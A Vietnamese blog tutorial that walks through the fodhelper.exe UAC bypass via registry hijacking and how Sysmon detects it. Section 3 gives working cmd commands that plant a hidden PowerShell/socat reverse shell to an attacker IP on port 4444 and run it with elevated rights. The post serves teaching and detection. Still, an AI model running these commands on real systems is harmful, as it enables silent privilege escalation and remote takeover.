---
title: "Kỹ thuật UAC Bypass"
description: "Thực hành lợi dụng Fodhelper.exe và Registry Hijacking"
date: 2026-05-08T12:00:00+07:00
math: false
license:
comments: true
draft: false
categories:
    - Security
    - Malware Analysis
    - SOC
tags:
    - uac-bypass
    - fodhelper
    - registry-hijacking
    - sysmon
    - privilege-escalation
build:
    list: always
---

Chào mừng các bạn quay trở lại với Series Giải phẫu Windows OS & SOC Analytics! Hôm nay, chúng ta đã tìm hiểu UAC là "người gác cổng" tuyệt vời với cơ chế Secure Desktop và Integrity Levels. Tuy nhiên, không có hệ thống nào là bất khả xâm phạm. Hôm nay, chúng ta sẽ trực tiếp đóng vai Hacker, lợi dụng chính những tính năng "tiện lợi" do Microsoft thiết kế để vượt mặt UAC một cách im lặng tuyệt đối (UAC Bypass), đồng thời học cách Blue Team "bắt tại htrận" ành vi này bằng Sysmon.

## 1. "Gót chân Achilles" của UAC: Tính năng AutoElevation

Để tránh làm phiền người dùng với quá nhiều bảng thông báo Yes/No, Microsoft đã thiết kế một tính năng gọi là Tự động nâng quyền (AutoElevation). Một số tệp thực thi cốt lõi của Windows (như `msconfig.exe` hay `fodhelper.exe`) được khai báo cờ `autoElevate` bên trong tệp kê khai (manifest) của chúng. Khi những phần mềm này chạy, Windows tự động cấp cho chúng quyền Cao nhất (High Integrity) mà không thèm hiện bảng hỏi UAC.

Hacker cực kỳ thích điều này. Nếu chúng có thể "bám đuôi" hoặc lừa một tiến trình autoElevate chạy mã độc hộ mình, mã độc đó sẽ nghiễm nhiên được kế thừa quyền High Integrity.

**Tại sao lại là Fodhelper.exe?**
`Fodhelper.exe` là một chương trình mặc định của Windows dùng để quản lý các tính năng tùy chọn (như thêm ngôn ngữ). Nó có cờ `autoElevate`. Nhưng điểm khiến `fodhelper.exe` trở thành "con mồi" hoàn hảo là: Không giống như msconfig cần phải mở giao diện đồ họa (GUI), fodhelper có thể bị lạm dụng thông qua một giao diện dòng lệnh (CLI) ngầm từ xa với quyền trung bình (Medium Integrity).

## 2. Cơ chế "Ký sinh": Registry Hijacking

Điểm yếu chí mạng của `fodhelper.exe` nằm ở cách nó tìm kiếm ứng dụng để mở. Khi hoạt động, tiến trình này sẽ liên tục quét vào Registry để tìm một khóa cụ thể liên quan đến giao thức `ms-settings` (URL Protocol mở cửa sổ Settings của Windows).

Đường dẫn mà fodhelper tìm kiếm là: `HKCU\Software\Classes\ms-settings\Shell\Open\command`

**Lỗ hổng nằm ở đâu?** Đường dẫn này nằm trong nhánh `HKEY_CURRENT_USER` (HKCU). Đây là nhánh cấu hình riêng của người dùng hiện tại, do đó không cần quyền Admin vẫn có thể ghi đè vào đây. Hacker (đang ở quyền Medium) chỉ cần ghi đường dẫn mã độc của chúng vào khóa này, sau đó kích hoạt `fodhelper.exe`. Tiến trình này tự động được nâng lên quyền High Integrity, sau đó nó ngây thơ đọc Registry và chạy mã độc của hacker với quyền lực tối cao.

## 3. Thực chiến: Đóng vai Hacker lách luật UAC

Bây giờ, chúng ta sẽ thực hiện kịch bản tấn công: Tạo một Reverse Shell (kết nối ngược) về máy chủ của hacker (ví dụ: máy Kali Linux có IP 10.48.95.226) bằng công cụ `socat`.

Tại cửa sổ CMD quyền thấp (Medium Integrity) trên máy nạn nhân, hacker thực hiện các lệnh sau:

### Bước 1: Thiết lập biến môi trường và Tải trọng (Payload)

```cmd
:: Trỏ đến vị trí Registry mà Fodhelper sẽ đọc
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

:: Thiết lập mã độc: Dùng PowerShell chạy ẩn công cụ socat để mở cổng 4444 kết nối về máy Hacker
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.48.95.226:4444 EXEC:cmd.exe,pipes"
```

> [Ghi chú: Lệnh trên thiết lập mã độc kết nối về IP của Hacker thông qua cổng 4444]

### Bước 2: Chìa khóa "DelegateExecute" (Đặt bẫy)

Đây là thủ thuật qua mặt hệ thống tinh vi nhất. Hacker chạy lệnh sau:

```cmd
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
```

Lệnh này tạo một giá trị tên là `DelegateExecute` nhưng để trống. Việc tạo giá trị này nhằm tắt cơ chế COM object chuẩn của Windows (chỉ định mã CLSID), buộc fodhelper phải quay lại đọc giá trị "Mặc định" (Default) của khóa command. Nếu thiếu dòng này, kỹ thuật Bypass sẽ thất bại.

### Bước 3: Ghi mã độc và Kích hoạt

```cmd
:: Ghi đè mã độc vào giá trị mặc định của khóa Registry
reg add %REG_KEY% /d %CMD% /f

:: Khởi chạy fodhelper để nó "cắn câu"
C:\Windows\System32\fodhelper.exe
```

Ngay khi `fodhelper.exe` chạy, nó đọc Registry, thấy `DelegateExecute` trống, bèn gọi lệnh `socat`. Tại máy Kali Linux đang mở cổng lắng nghe (`nc -lvp 4444`), Hacker nhận được một Shell với quyền Administrator cao nhất mà màn hình nạn nhân không hề chớp nháy hay hiện bảng UAC nào!

> [Ghi chú: Chèn ảnh minh họa cửa sổ Netcat bên máy Kali Linux nhận được kết nối Reverse Shell từ máy Windows vào đây]

## 4. Góc nhìn SOC: "Bắt tại trận" bằng Sysmon

Hacker có thể qua mặt được UAC, nhưng không thể vô hình trước "mắt thần" Sysmon. Khi kịch bản UAC Bypass via Registry Hijacking này xảy ra, hệ thống Sysmon sẽ nổ ra một chuỗi cảnh báo (Alert) liên tục:

### 4.1 Bắt quả tang hành vi sửa Registry (Event ID 12 & 13)

Vì hacker phải tạo khóa và ghi giá trị vào Registry, Sysmon sẽ ghi nhận:
- **Event ID 12 (Registry object added):** Ghi nhận việc nhánh `ms-settings\Shell\Open\command` vừa được tạo mới.
- **Event ID 13 (Registry value set):** Ghi nhận việc một tiến trình lạ vừa đặt giá trị `DelegateExecute` và chèn mã lệnh `powershell... socat...` vào Registry.

### 4.2 Bắt quả tang tiến trình con bất thường (Event ID 1)

Event ID 1 (Process Create) là chốt chặn cuối cùng. Khi xem log, SOC Analyst sẽ thấy một chuỗi logic cực kỳ đáng ngờ:
- **Tiến trình cha (ParentImage):** Là `C:\Windows\System32\fodhelper.exe` (chạy với IntegrityLevel: High).
- **Tiến trình con (Image):** Lại là `powershell.exe` hoặc `socat.exe`.

Một phần mềm quản lý cài đặt ngôn ngữ (`fodhelper.exe`) lại đi gọi `powershell.exe` chạy ẩn để gọi tiếp `socat.exe` kết nối ra IP bên ngoài qua cổng 4444? Đây là dấu hiệu 100% của việc lạm dụng tiến trình hệ thống để leo thang đặc quyền!

---

*Bypass UAC thông qua Fodhelper.exe và Registry Hijacking là một kỹ thuật kinh điển nhưng vẫn vô cùng hiệu quả, minh chứng cho việc hacker biến chính "tính năng" tiện lợi của Windows thành "vũ khí". Việc hiểu sâu cơ chế này kết hợp với khả năng phân tích Event ID của Sysmon sẽ giúp bạn viết ra những tập luật (Rule) SIEM cực kỳ sắc bén. Ở các bài viết tiếp theo, chúng ta sẽ chính thức bước vào phân tích Network Forensics và cách giải mã các gói tin độc hại. Hãy cùng chờ đón nhé!*
